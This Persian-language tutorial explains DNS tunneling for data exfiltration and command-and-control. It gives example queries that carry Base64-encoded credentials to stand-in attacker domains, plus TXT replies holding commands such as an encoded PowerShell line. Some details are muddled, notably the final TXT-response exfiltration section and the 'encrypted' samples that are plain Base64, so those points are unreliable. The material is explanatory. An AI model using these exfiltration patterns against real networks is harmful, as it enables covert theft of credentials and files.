


**سامانه نام دامنه (DNS)** یکی از مهم‌ترین فناوری‌هایی است که در اینترنت و شبکه‌سازی به‌طور کلی استفاده می‌شود. این سیستم آدرس‌های IP را به نام‌های دامنه قابل فهم برای انسان تبدیل می‌کند که به آن‌ها **URL** نیز گفته می‌شود، تا کاربران بتوانند راحت‌تر به وب‌سایت‌ها دسترسی پیدا کنند. DNS ضروری است زیرا انسان‌ها در به‌خاطر سپردن عباراتی مثل **catchpoint.com** بسیار بهتر از حفظ کردن آدرس‌های IP هستند—به‌خصوص که آدرس‌های **IPv6** شامل ۱۲۸ بیت هستند!

از آنجایی‌که DNS سال‌هاست جزء فناوری‌های حیاتی بوده است، مهاجمان سایبری همیشه آن را برای یافتن آسیب‌پذیری‌ها بررسی کرده‌اند. یکی از مخرب‌ترین انواع حملات DNS، حمله‌ای است که **DNS Tunneling** یا **تونل‌زنی DNS** نام دارد.

---

## **DNS Tunneling چیست؟**

DNS Tunneling نوعی حمله است که با سوءاستفاده از مفهوم **اسب تروا (Trojan Horse)** انجام می‌شود، به این شکل که مهاجم کد یا برنامه‌های مخرب را درون پیامی قرار می‌دهد که ظاهراً شبیه یک درخواست DNS معمولی است.

از آنجایی که DNS جزء حیاتی تقریباً تمام فعالیت‌های شبکه و اینترنت است، این نوع ترافیک معمولاً بدون بررسی دقیق از فایروال‌ها و سیستم‌های امنیتی عبور می‌کند.

---

## **مراحل کلی اجرای یک حمله DNS Tunneling**

### **۱. ثبت یک دامنه توسط مهاجم**

مهاجم یک دامنه اینترنتی ثبت می‌کند و حتی ممکن است یک وب‌سایت کاملاً طبیعی روی آن قرار دهد. اما در پشت صحنه، روی همان سرور ابزار و بدافزارهای مخصوص DNS tunneling قرار داده می‌شود تا در زمان اتصال قربانی فعال شود.

### **۲. آلوده کردن یک کامپیوتر در شبکه هدف**

مرحله‌ی بعد—که معمولاً سخت‌ترین قسمت است—این است که مهاجم بتواند یکی از سیستم‌های داخل شبکه هدف را به بدافزار آلوده کند. این کار روش‌های مختلفی دارد: سایت‌های آلوده، ایمیل‌های مخرب، USB آلوده و حتی سخت‌افزار دست‌کاری شده.

### **۳. ارتباط سیستم آلوده با وب‌سایت مهاجم**

وقتی حمله آماده باشد، سیستم آلوده تلاش می‌کند به وب‌سایت مهاجم وصل شود. بخشی از این اتصال، ارسال یک **درخواست DNS** برای یافتن آدرس آن وب‌سایت است. درخواست‌های DNS تقریباً همیشه از فایروال عبور داده می‌شوند، و این یعنی مهاجم یک **کانال ورودی مخفی** (Covert Channel) به شبکه پیدا می‌کند.

### **۴. عبور کد مخرب از طریق DNS Resolver**

وقتی ارتباط برقرار شد و DNS پاسخ مثبت داد، سرور مهاجم می‌تواند **کدها یا داده‌های بیشتری** را از طریق پاسخ‌های DNS وارد شبکه هدف کند. این کدها می‌توانند:

- داده‌ها را جمع‌آوری کنند
    
- بدافزارهای اضافی نصب کنند
    
- دسترسی طولانی‌مدت برای مهاجم فراهم کنند
    
- و بسیاری اقدامات دیگر
    

به این روش مهاجم می‌تواند از سیستم‌های محافظت‌شده عبور کرده و ارتباط مخفیانه‌ای برقرار کند.

# 🎯 **چطور کلاینت آلوده با مهاجم ارتباط برقرار می‌کند؟**

اصلی‌ترین نکته این است:

## **مهاجم داده‌های خودش را داخل نام دامنه (DNS Query) پنهان می‌کند.**

و چون DNS همیشه اجازه عبور دارد، این داده‌ها _از دیوار آتش رد می‌شوند_.

بذار با یک مثال شفاف کامل برات توضیح بدم.

---

# 🧩 **قدم ۱ — مهاجم یک دامنه ثبت می‌کند**

مثلاً مهاجم یک دامنه می‌سازد:

```
malicious-attacker.com
```

و کنترل کامل DNS آن دامنه را دارد.

یعنی DNS سرور این دامنه → دست مهاجم است.

---

# 🧩 **قدم ۲ — روی سیستم قربانی یک بدافزار نصب می‌شود**

این بدافزار این کار را انجام می‌دهد:

- داده را جمع می‌کند
    
- داده را رمزگذاری می‌کند
    
- آن را داخل یک **DNS Query** جاسازی می‌کند
    
- و آن را برای دامنه مهاجم می‌فرستد
    

---

# 🧩 **قدم ۳ — بدافزار داده را داخل یک Subdomain جاسازی می‌کند**

مثال:

فرض کن بدافزار باید این متن را برای مهاجم بفرستد:

```
username=admin
```

این داده را اول:

1. Base64 می‌کند
    
2. سپس داخل Subdomain قرار می‌دهد:
    

```
dXNlcm5hbWU9YWRtaW4=.malicious-attacker.com
```

این یک DNS Query‌ کاملاً عادی به‌نظر می‌رسد ولی **داخلش داده پنهان شده**.

---

# 🧩 **قدم ۴ — این Query از فایروال عبور می‌کند**

چرا؟

چون:

- DNS پورت 53 است (UDP/TCP)
    
- در همه شبکه‌ها مجازه
    
- فایروال‌ها DNS را بلاک نمی‌کنند
    
- ترافیک DNS از نظر ظاهری معمولی است
    
- آنتی‌ویروس هم معمولاً DNS را بررسی نمی‌کند
    

پس فایروال فکر می‌کند این فقط یک درخواست عادی DNS برای resolve کردن یک دامنه است.

---

# 🧩 **قدم ۵ — DNS سرور مهاجم Query را دریافت می‌کند**

چون دامنه برای مهاجم است، DNS سرور مهاجم این درخواست را می‌بیند:

```
dXNlcm5hbWU9YWRtaW4=.malicious-attacker.com
```

و مهاجم می‌تواند Base64 را decode کند و داده را بکشد بیرون:

```
username=admin
```

👉 **این می‌شود یک کانال ارتباطی مخفی (Covert Channel).**

---

# 🧩 **قدم ۶ — مهاجم حتی می‌تواند جواب هم بدهد**

DNS پاسخ هم دارد.

یعنی مهاجم داخل پاسخ DNS هم داده مخفی قرار می‌دهد.

مثلاً در DNS Answer بخش TXT Record:

```
evil-command=download_new_payload
```

بدافزار داخل سیستم قربانی این پاسخ را decode می‌کند و فرمان مهاجم را اجرا می‌کند.

این می‌شود:

### **حالت Command & Control (C2) از طریق DNS**

بدون نیاز به HTTP  
بدون نیاز به HTTPS  
بدون نیاز به باز بودن پورت جدید  
بدون نیاز به VPN

فقط و فقط با **DNS**.

---

# 🎯 **پس خلاصه اینکه کانال ارتباطی چطور ساخته می‌شود؟**

۱) **بدافزار روی قربانی → داده را داخل Subdomain جاسازی می‌کند**  
۲) **DNS Query به دامنه مهاجم → همیشه از فایروال رد می‌شود**  
۳) **DNS سرور مهاجم → داده را از Query استخراج می‌کند**  
۴) **مهاجم → پاسخ DNS را با داده مخفی برمی‌گرداند**  
۵) **بدافزار → پاسخ را decode می‌کند و دستورات را اجرا می‌کند**

این رفت و برگشت = **کانال مخفی (DNS Tunnel)**

---

# 🎯 اول ببینیم DNS Answer چی هست؟

وقتی سیستم قربانی یک درخواست DNS می‌فرستد، DNS پاسخ (Answer) برمی‌گرداند.

مثلاً برای google.com پاسخ شامل:

- IP Address (A record)
- TTL
- و گاهی داده‌های دیگر

اما… DNS فقط A رکورد ندارد.

DNS می‌تواند رکوردهای دیگری برگرداند، از جمله:

- **TXT record**
- MX
- CNAME
- NS
- AAAA
- …  

---

# ⭐ TXT Record چیست؟

TXT Record نوعی رکورد DNS است که فقط یک کار می‌کند:

### **حمل داده متنی (Text Data)**

یعنی در پاسخ DNS می‌توان متن دلخواه (strings) قرار داد.

مثال واقعی:

```
google.com   TXT   "v=spf1 -all"
```

این یک پاسخ DNS معتبر است که داخلش متن وجود دارد.

---

# 🎯 حالا مهاجم چطور از TXT Record سوءاستفاده می‌کند؟

اینجاست که موضوع جذاب می‌شود.

## مهاجم از TXT Record برای ارسال دستور (Command) به بدافزار استفاده می‌کند.

یعنی وقتی سیستم قربانی یک DNS Query می‌فرستد،  
DNS سرور مهاجم می‌تواند در پاسخ خودش یک TXT Record قرار بدهد که:

- داخلش یک دستور باشد  
- یا یک payload جدید  
- یا یک config جدید  

بدافزار داخل سیستم قربانی پاسخ DNS را decode می‌کند و عمل می‌کند.

---

# 🧩 بیا مثالی خیلی ساده بزنیم

### قربانی Query می‌فرستد:

```
dGVzdA==.attacker.com
```

این Query دادهٔ رمزگذاری‌شده را برای مهاجم می‌فرستد.

### حالا DNS سرور مهاجم پاسخ می‌دهد:

```
TXT   "cmd=download_new_payload"
```

یعنی پاسخ DNS این شکلی است:

```
attacker.com   TXT   "cmd=download_new_payload"
```

بدافزار Response را می‌خواند و داخلش دستور را پیدا می‌کند:

```
cmd=download_new_payload
```

و شروع می‌کند payload جدید را دانلود و اجرا می‌کند.

---

# 🎯 مثال کامل‌تر

### 1) درخواست قربانی:

```
YWJjMTIzLm...LmF0dGFja2VyLmNvbQ==
```

### 2) پاسخ مهاجم:

```
TXT "RUN: powershell -enc JAB3AGU..."
```

بدافزار داخل سیستم:

- پاسخ DNS را دریافت می‌کند  
- متن داخل TXT را استخراج می‌کند  
- دستور را decode می‌کند  
- دستور را **همان لحظه اجرا** می‌کند  

این دقیقاً همان **C2 (Command & Control) از طریق DNS** است.

---

# 🔥 چرا TXT Record بهترین گزینه برای مهاجم است؟

✔ حجم زیادی از داده را می‌تواند حمل کند  
✔ ماهیتش متنی است، پس مشکوک بنظر نمی‌رسد  
✔ فایروال‌ها معمولاً بررسی نمی‌کنند  
✔ قابل رمزگذاری، فشرده‌سازی، تقسیم‌بندی  
✔ ۱۰۰٪ قانونی است — در همه شبکه‌ها وجود دارد  

به همین دلیل ابزارهایی مثل:

- Iodine  
- DNScat2  
- DNSExfiltrator  
- Heyoka  

همه از TXT Record استفاده می‌کنند.

---

# 🎯 **کل ایدهٔ Data Exfiltration با DNS چیه؟**

اینه:

## 👉 مهاجم دادهٔ واقعی (مثل فایل، پسورد، Cookie، Token، Credential، Log، Database)  
را تکه‌تکه می‌کند،  
رمزگذاری می‌کند،  
و داخل **Subdomain** یا **TXT Record** قرار می‌دهد.  
و این ترافیک شبیه DNS عادی دیده می‌شود.

و چون DNS همیشه باز است → اطلاعات از کشور/شرکت خارج می‌شود.

---

# 🔍 **بیا قدم‌به‌قدم یک سناریو واقعی را با مثال ببینیم**

فرض کن مهاجم می‌خواهد فایل زیر را از سیستم خارج کند:

```
passwords.txt
```

محتوایش:

```
user=admin
pass=123456
```

---

# 🧩 **قدم ۱ — بدافزار فایل را می‌خواند**

بدافزار محتوای فایل را می‌گیرد:

```
user=admin
pass=123456
```

---

# 🧩 **قدم ۲ — بدافزار داده را رمزگذاری و Base64 می‌کند**

رمزگذاری (AES یا XOR)  
بعد Base64:

مثلاً می‌شود:

```
dXNlcj1hZG1pbgoKcGFzcz0xMjM0NTY=
```

---

# 🧩 **قدم ۳ — داده برای ارسال خیلی بزرگ است، پس بدافزار آن را تکه‌تکه می‌کند**

مثلاً تکه‌ها:

```
dXNlcj1h
ZG1pbgoK
cGFzcz0x
MjM0NTY=
```

---

# 🧩 **قدم ۴ — بدافزار هر تکه را داخل *Subdomain* قرار می‌دهد**

و هر تکه را به دامنه مهاجم می‌فرستد.

مثلاً:

### Query اول:
```
dXNlcj1h.attacker.com
```

### Query دوم:
```
ZG1pbgoK.attacker.com
```

### Query سوم:
```
cGFzcz0x.attacker.com
```

### Query چهارم:
```
MjM0NTY=.attacker.com
```

هر کدام از این‌ها **یک DNS Query کاملاً قانونی** است.

---

# 🧩 **قدم ۵ — همهٔ DNS Queryها از فایروال عبور می‌کنند**

چون:

- DNS همیشه مجازه  
- همه شرکت‌ها Port 53 را Allow می‌کنند  
- IDS/IPS معمولاً DNS payload را بررسی نمی‌کند  
- اندازه پکت‌های DNS کوچک است (مثلاً هر 80 بایت) و جلب توجه نمی‌کند  

در نتیجه، همه این‌ها به **DNS سرور مهاجم** می‌رسد.

---

# 🧩 **قدم ۶ — مهاجم همه Queryها را ذخیره می‌کند**

روی سرور مهاجم، لاگ DNS این شکلی خواهد بود:

```
[dXNlcj1h].attacker.com
[ZG1pbgoK].attacker.com
[cGFzcz0x].attacker.com
[MjM0NTY=].attacker.com
```

مهاجم این ۴ تکه را کنار هم می‌گذارد:

```
dXNlcj1hZG1pbgoKcGFzcz0xMjM0NTY=
```

و Base64 را decode می‌کند:

```
user=admin
pass=123456
```

🎉 داده خارج شد  
(بدون HTTP، بدون FTP، بدون SSH — فقط DNS)

# 🔥 **اما روش دوم هم هست: ارسال دیتا از طریق TXT Record**

بدافزار ممکنه اطلاعات را این‌طور بفرستد:

### Query:
```
attacker.com
```

### و داده داخل پاسخ TXT:

```
TXT "dXNlcj1hZG1pbgoKcGFzcz0xMjM0NTY="
```

در این نسخه، **مهاجم درخواست Query نمی‌گیرد** بلکه **اطلاعات را داخل پاسخ DNS می‌گیرد**.

ولی روش متداول‌تر، **Subdomain-based Exfiltration** است.
